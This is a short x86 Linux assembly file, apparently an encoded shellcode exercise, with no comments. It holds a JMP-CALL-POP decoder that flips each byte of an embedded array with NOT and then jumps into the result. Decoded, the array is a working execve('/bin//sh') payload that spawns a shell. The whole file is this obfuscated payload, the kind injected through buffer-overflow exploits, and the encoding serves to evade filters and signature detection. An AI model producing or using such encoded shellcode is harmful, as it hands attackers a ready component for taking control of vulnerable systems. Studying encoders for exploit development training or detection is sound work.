global _start 


section .text 

_start: 
	jmp short call_decoder 


decoder:
	pop esi
loo:
	not byte [esi]
	jz code 
	inc esi
	jmp loo

call_decoder:
	call decoder
	code: db 0xce, 0x3f, 0xaf, 0x97, 0xd0, 0xd0, 0x8c, 0x97, 0x97, 0xd0, 0x9d, 0x96, 0x91, 0x76, 0x1c, 0xaf, 0x76, 0x1d, 0xac, 0x76, 0x1e, 0x4f, 0xf4, 0x32, 0x7f, 0xff
